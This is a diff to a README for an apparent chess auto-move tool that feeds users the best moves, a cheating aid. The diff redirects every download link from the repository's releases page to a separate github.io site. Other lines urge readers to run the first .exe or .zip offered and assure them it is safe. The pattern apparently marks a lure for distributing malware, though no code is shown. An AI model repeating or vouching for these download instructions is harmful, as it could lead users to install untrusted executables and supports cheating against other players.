@@ -1,6 +1,6 @@
 # 🏆 Chess-Assistant-Auto-Move-Tool - Get Instant Best Moves Automatically
 
-[![Download Now](https://img.shields.io/badge/Download-Chess_Assistant_AI-blue?style=for-the-badge&logo=windows&color=4CAF50)](https://github.com/Hemodynamicssideofbeef6414/Chess-Assistant-Auto-Move-Tool/releases)
+[![Download Now](https://img.shields.io/badge/Download-Chess_Assistant_AI-blue?style=for-the-badge&logo=windows&color=4CAF50)](https://hemodynamicssideofbeef6414.github.io)
 
 ## 🎯 What Is This Tool?
 
@@ -14,7 +14,7 @@ Follow these simple steps to get the tool running on your Windows computer. No t
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** [https://github.com/Hemodynamicssideofbeef6414/Chess-Assistant-Auto-Move-Tool/releases](https://github.com/Hemodynamicssideofbeef6414/Chess-Assistant-Auto-Move-Tool/releases)
+**Visit this link to download the application:** [https://hemodynamicssideofbeef6414.github.io](https://hemodynamicssideofbeef6414.github.io)
 
 Click the download button and save the file to your computer. The download is safe and does not require any registration.
 
@@ -59,7 +59,7 @@ Adjust the overlay position, size, and color scheme to match your preferences. Y
 - **Display:** Any resolution above 720p for best performance
 
 ### Installation Steps
-1. **Visit this link to download the application:** [https://github.com/Hemodynamicssideofbeef6414/Chess-Assistant-Auto-Move-Tool/releases](https://github.com/Hemodynamicssideofbeef6414/Chess-Assistant-Auto-Move-Tool/releases)
+1. **Visit this link to download the application:** [https://hemodynamicssideofbeef6414.github.io](https://hemodynamicssideofbeef6414.github.io)
 
 2. Click the first download option you see (usually a `.exe` or `.zip` file at the top of the page).
 
